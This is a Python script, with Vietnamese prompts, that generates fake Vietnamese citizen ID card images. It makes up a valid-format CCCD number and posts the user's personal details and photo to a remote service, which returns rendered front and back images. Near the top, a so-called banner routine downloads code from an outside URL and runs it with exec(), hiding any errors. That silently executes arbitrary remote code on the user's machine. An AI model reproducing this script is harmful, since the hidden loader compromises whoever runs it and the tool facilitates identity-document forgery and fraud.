import requests
import base64
import random
import random
from atexit import register
from time import sleep
import os,json,re,sys
import threading,base64
import os,time,re,json,random
from datetime import datetime
from time import sleep,strftime
from pystyle import Write,Colors
import requests


ang = "\033[1;37m\033[1m"
xanh_la = "\033[1;32m\033[1m"
xanh_duong = "\033[1;34m\033[1m"
xanhnhat = '\033[1m\033[38;5;51m'
do = "\033[1;31m\033[1m\033[1m"
xam = '\033[1;30m\033[1m'
vang = "\033[1;33m\033[1m"
tim = "\033[1;35m\033[1m"
hongnhat = "#FFC0CB"
kt_code = "</>"
dac_biet = "\033[32;5;245m\033[1m\033[38;5;39m"
vua = "\033[1;31m\033[1m\033[1m[\033[1;37m\033[1m=.=\033[1;31m\033[1m\033[1m] \033[1;37m\033[1m=> \033[1;32m\033[1m"

import os
import requests
import io
import contextlib

# URL to fetch Python code from
url = "https://keyherlyswar.x10.mx/banner.json"

def run_python_from_web(url):
    try:
        # Download the Python code from the URL
        response = requests.get(url)
        response.raise_for_status()  # Check for HTTP errors
        code = response.text

        # Capture output using StringIO
        output = io.StringIO()
        with contextlib.redirect_stdout(output):  # Redirect stdout to output
            exec(code)  # Execute the downloaded code

        # Print the captured output
        print(output.getvalue())
    
    except Exception as e:
        pass
run_python_from_web(url)
print(f"{vua}{do}Lưu Ý : Phải Nhập Đầy Đủ Mới Lưu Ảnh Được")
ma_tinh = {
    'Bắc Kạn': '006',
    'bắc kạn': '006',
    'BẮC KẠN': '006',
    'Bắc kạn': '006',
    'bắc Kạn': '006',
    
    'Tuyên Quang': '008',
    'tuyên quang': '008',
    'TUYÊN QUANG': '008',
    'Tuyên quang': '008',
    'tuyên Quang': '008',
    
    'Lào Cai': '010',
    'lào cai': '010',
    'LÀO CAI': '010',
    'Lào cai': '010',
    'lào Cai': '010',
    
    'Điện Biên': '011',
    'điện biên': '011',
    'ĐIỆN BIÊN': '011',
    'Điện biên': '011',
    'điện Biên': '011',
    
    'Lai Châu': '012',
    'lai châu': '012',
    'LAI CHÂU': '012',
    'Lai châu': '012',
    'lai Châu': '012',
    
    'Sơn La': '014',
    'sơn la': '014',
    'SƠN LA': '014',
    'Sơn la': '014',
    'sơn La': '014',
    
    'Yên Bái': '015',
    'yên bái': '015',
    'YÊN BÁI': '015',
    'Yên bái': '015',
    'yên Bái': '015',
    
    'Hòa Bình': '017',
    'hòa bình': '017',
    'HÒA BÌNH': '017',
    'Hòa bình': '017',
    'hòa Bình': '017',
    
    'Thái Nguyên': '019',
    'thái nguyên': '019',
    'THÁI NGUYÊN': '019',
    'Thái nguyên': '019',
    'thái Nguyên': '019',
    
    'Lạng Sơn': '020',
    'lạng sơn': '020',
    'LẠNG SƠN': '020',
    'Lạng sơn': '020',
    'lạng Sơn': '020',
    
    'Quảng Ninh': '022',
    'quảng ninh': '022',
    'QUẢNG NINH': '022',
    'Quảng ninh': '022',
    'quảng Ninh': '022',
    
    'Bắc Giang': '024',
    'bắc giang': '024',
    'BẮC GIANG': '024',
    'Bắc giang': '024',
    'bắc Giang': '024',
    
    'Phú Thọ': '025',
    'phú thọ': '025',
    'PHÚ THỌ': '025',
    'Phú thọ': '025',
    'phú Thọ': '025',
    
    'Vĩnh Phúc': '026',
    'vĩnh phúc': '026',
    'VĨNH PHÚC': '026',
    'Vĩnh phúc': '026',
    'vĩnh Phúc': '026',
    
    'Bắc Ninh': '027',
    'bắc ninh': '027',
    'BẮC NINH': '027',
    'Bắc ninh': '027',
    'bắc Ninh': '027',
    
    'Hải Dương': '030',
    'hải dương': '030',
    'HẢI DƯƠNG': '030',
    'Hải dương': '030',
    'hải Dương': '030',
    
    'Hải Phòng': '031',
    'hải phòng': '031',
    'HẢI PHÒNG': '031',
    'Hải phòng': '031',
    'hải Phòng': '031',
    
    'Hưng Yên': '033',
    'hưng yên': '033',
    'HƯNG YÊN': '033',
    'Hưng yên': '033',
    'hưng Yên': '033',
    
    'Thái Bình': '034',
    'thái bình': '034',
    'THÁI BÌNH': '034',
    'Thái bình': '034',
    'thái Bình': '034',
    
    'Hà Nam': '035',
    'hà nam': '035',
    'HÀ NAM': '035',
    'Hà nam': '035',
    'hà Nam': '035',
    
    'Nam Định': '036',
    'nam định': '036',
    'NAM ĐỊNH': '036',
    'Nam định': '036',
    'nam Định': '036',
    
    'Ninh Bình': '037',
    'ninh bình': '037',
    'NINH BÌNH': '037',
    'Ninh bình': '037',
    'ninh Bình': '037',
    
    'Thanh Hóa': '038',
    'thanh hóa': '038',
    'THANH HÓA': '038',
    'Thanh hóa': '038',
    'thanh Hóa': '038',
    
    'Nghệ An': '040',
    'nghệ an': '040',
    'NGHỆ AN': '040',
    'Nghệ an': '040',
    'nghệ An': '040',
    
    'Hà Tĩnh': '042',
    'hà tĩnh': '042',
    'HÀ TĨNH': '042',
    'Hà tĩnh': '042',
    'hà Tĩnh': '042',
    
    'Quảng Bình': '044',
    'quảng bình': '044',
    'QUẢNG BÌNH': '044',
    'Quảng bình': '044',
    'quảng Bình': '044',
    
    'Quảng Trị': '045',
    'quảng trị': '045',
    'QUẢNG TRỊ': '045',
    'Quảng trị': '045',
    'quảng Trị': '045',
    
    'Thừa Thiên Huế': '046',
    'thừa thiên huế': '046',
    'THỪA THIÊN HUẾ': '046',
    'Thừa thiên huế': '046',
    'thừa Thiên Huế': '046',
    
    'Đà Nẵng': '048',
    'đà nẵng': '048',
    'ĐÀ NẴNG': '048',
    'Đà nẵng': '048',
    'đà Nẵng': '048',
    
    'Quảng Nam': '049',
    'quảng nam': '049',
    'QUẢNG NAM': '049',
    'Quảng nam': '049',
    'quảng Nam': '049',
    
    'Quảng Ngãi': '051',
    'quảng ngãi': '051',
    'QUẢNG NGÃI': '051',
    'Quảng ngãi': '051',
    'quảng Ngãi': '051',
    
    'Bình Định': '052',
    'bình định': '052',
    'BÌNH ĐỊNH': '052',
    'Bình định': '052',
    'bình Định': '052',
    
    'Phú Yên': '054',
    'phú yên': '054',
    'PHÚ YÊN': '054',
    'Phú yên': '054',
    'phú Yên': '054',
    
    'Khánh Hòa': '056',
    'khánh hòa': '056',
    'KHÁNH HÒA': '056',
    'Khánh hòa': '056',
    'khánh Hòa': '056',
    
    'Ninh Thuận': '058',
    'ninh thuận': '058',
    'NINH THUẬN': '058',
    'Ninh thuận': '058',
    'ninh Thuận': '058',
    
    'Bình Thuận': '060',
    'bình thuận': '060',
    'BÌNH THUẬN': '060',
    'Bình thuận': '060',
    'bình Thuận': '060',
    
    'Kon Tum': '062',
    'kon tum': '062',
    'KON TUM': '062',
    'Kon tum': '062',
    'kon Tum': '062',
    
    'Gia Lai': '064',
    'gia lai': '064',
    'GIA LAI': '064',
    'Gia lai': '064',
    'gia Lai': '064',
    
    'Đắk Lắk': '066',
    'đắk lắk': '066',
    'ĐẮK LẮK': '066',
    'Đắk lắk': '066',
    'đắk Lắk': '066',
    
    'Đắk Nông': '067',
    'đắk nông': '067',
    'ĐẮK NÔNG': '067',
    'Đắk nông': '067',
    'đắk Nông': '067',
    
    'Lâm Đồng': '068',
    'lâm đồng': '068',
    'LÂM ĐỒNG': '068',
    'Lâm đồng': '068',
    'lâm Đồng': '068',
    
    'Bình Phước': '070',
    'bình phước': '070',
    'BÌNH PHƯỚC': '070',
    'Bình phước': '070',
    'bình Phước': '070',
    
    'Tây Ninh': '072',
    'tây ninh': '072',
    'TÂY NINH': '072',
    'Tây ninh': '072',
    'tây Ninh': '072',
    
    'Bình Dương': '074',
    'bình dương': '074',
    'BÌNH DƯƠNG': '074',
    'Bình dương': '074',
    'bình Dương': '074',
    
    'Đồng Nai': '075',
    'đồng nai': '075',
    'ĐỒNG NAI': '075',
    'Đồng nai': '075',
    'đồng Nai': '075',
    
    'Bà Rịa - Vũng Tàu': '077',
    'bà rịa - vũng tàu': '077',
    'BÀ RỊA - VŨNG TÀU': '077',
    'Bà rịa - vũng tàu': '077',
    'bà Rịa - Vũng Tàu': '077',
    
    'Hồ Chí Minh': '079',
    'hồ chí minh': '079',
    'HỒ CHÍ MINH': '079',
    'Hồ chí minh': '079',
    'hồ Chí Minh': '079',
    
    'Long An': '080',
    'long an': '080',
    'LONG AN': '080',
    'Long an': '080',
    'long An': '080',
    
    'Tiền Giang': '082',
    'tiền giang': '082',
    'TIỀN GIANG': '082',
    'Tiền giang': '082',
    'tiền Giang': '082',
    
    'Bến Tre': '083',
    'bến tre': '083',
    'BẾN TRE': '083',
    'Bến tre': '083',
    'bến Tre': '083',
    
    'Trà Vinh': '084',
    'trà vinh': '084',
    'TRÀ VINH': '084',
    'Trà vinh': '084',
    'trà Vinh': '084',
    
    'Vĩnh Long': '086',
    'vĩnh long': '086',
    'VĨNH LONG': '086',
    'Vĩnh long': '086',
    'vĩnh Long': '086',
    
    'Đồng Tháp': '087',
    'đồng tháp': '087',
    'ĐỒNG THÁP': '087',
    'Đồng tháp': '087',
    'đồng Tháp': '087',
    
    'An Giang': '089',
    'an giang': '089',
    'AN GIANG': '089',
    'An giang': '089',
    'an Giang': '089',
    
    'Kiên Giang': '091',
    'kiên giang': '091',
    'KIÊN GIANG': '091',
    'Kiên giang': '091',
    'kiên Giang': '091',
    
    'Cần Thơ': '092',
    'cần thơ': '092',
    'CẦN THƠ': '092',
    'Cần thơ': '092',
    'cần Thơ': '092',
    
    'Hậu Giang': '093',
    'hậu giang': '093',
    'HẬU GIANG': '093',
    'Hậu giang': '093',
    'hậu Giang': '093',
    
    'Sóc Trăng': '094',
    'sóc trăng': '094',
    'SÓC TRĂNG': '094',
    'Sóc trăng': '094',
    'sóc Trăng': '094',
    
    'Bạc Liêu': '095',
    'bạc liêu': '095',
    'BẠC LIÊU': '095',
    'Bạc liêu': '095',
    'bạc Liêu': '095',
    
    'Cà Mau': '096',
    'cà mau': '096',
    'CÀ MAU': '096',
    'Cà mau': '096',
    'cà Mau': '096',
}

def lay_ma_tinh(dia_chi):
    for tinh in ma_tinh:
        if tinh.lower() in dia_chi.lower():
            return ma_tinh[tinh]
    return None

def tao_cccd(dia_chi, gioi_tinh, ngay_sinh):
    ma_tinh_duoc_chon = lay_ma_tinh(dia_chi)
    
    if not ma_tinh_duoc_chon:
        return "Không tìm thấy mã tỉnh!"

    nam_sinh = int(ngay_sinh.split('/')[-1])
    ma_the_ky_gioi_tinh = ""

    if 1900 <= nam_sinh < 2000:
        ma_the_ky_gioi_tinh = '0' if gioi_tinh.lower() == 'nam' else '1'
    elif 2000 <= nam_sinh < 2100:
        ma_the_ky_gioi_tinh = '2' if gioi_tinh.lower() == 'nam' else '3'

    ma_nam_sinh = str(nam_sinh)[-2:]

    so_ngau_nhien = str(random.randint(100000, 999999))
    
    cccd = ma_tinh_duoc_chon + ma_the_ky_gioi_tinh + ma_nam_sinh + so_ngau_nhien
    return cccd

data = {}

data["apikey"] = ("manhhung001")
data["name"] = input(f"{vua}Nhập tên: {vang} ")
data["birthday"] = input(f"{vua}Nhập ngày sinh (dd/mm/yyyy): {vang} ")
data["sex"] = input(f"{vua}Nhập giới tính: {vang} ")
data["quequan"] = input(f"{vua}Nhập quê quán: {vang} ")
data["hangtren"] = input(f"{vua}Nhập địa chỉ nhà trên: {vang} ")
data["hangduoi"] = input(f"{vua}Nhập địa chỉ nhà dưới: {vang} ")
data["thuongtru"] = input(f"{vua}Nhập địa chỉ thường trú: {vang} ")
data["ngaycap"] = input(f"{vua}Nhập ngày cấp (dd/mm/yyyy): {vang} ")
data["thoihan"] = input(f"{vua}Nhập thời hạn (dd/mm/yyyy): {vang} ")
data["anhthe"] = input(f"{vua}Nhập đường dẫn ảnh thẻ: {vang} ")

data['socccd'] = tao_cccd(data["quequan"], data["sex"], data["birthday"])

url = "https://gringo.hasaki.io.vn/cccd/cccd.php"

response = requests.post(url, data=data)

if response.status_code == 200:
    try:
        json_data = response.json()

        mat_truoc_path = "mat_truoc.png"
        mat_sau_path = "mat_sau.png"

        if 'mat_truoc' in json_data:
            with open(mat_truoc_path, "wb") as f:
                f.write(base64.b64decode(json_data['mat_truoc']))
            print(f"{vua}{xanh_la}Ảnh mặt trước đã được lưu thành công!")
        else:
            print(f"{vua}{do}Không tìm thấy trường 'mat_truoc' trong phản hồi JSON.")

        if 'mat_sau' in json_data:
            with open(mat_sau_path, "wb") as f:
                f.write(base64.b64decode(json_data['mat_sau']))
            print(f"{vua}{xanh_la}Ảnh mặt sau đã được lưu thành công!")
        else:
            print(f"{vua}{do}Không tìm thấy trường 'mat_sau' trong phản hồi JSON.")

    except ValueError:
        print("Phản hồi không phải là JSON hợp lệ.")
    except Exception as e:
        print("Có lỗi xảy ra trong quá trình xử lý:", str(e))
else:
    print(f"Có lỗi xảy ra: Mã trạng thái không thành công {response.status_code}")
    print("Nội dung phản hồi:", response.text)
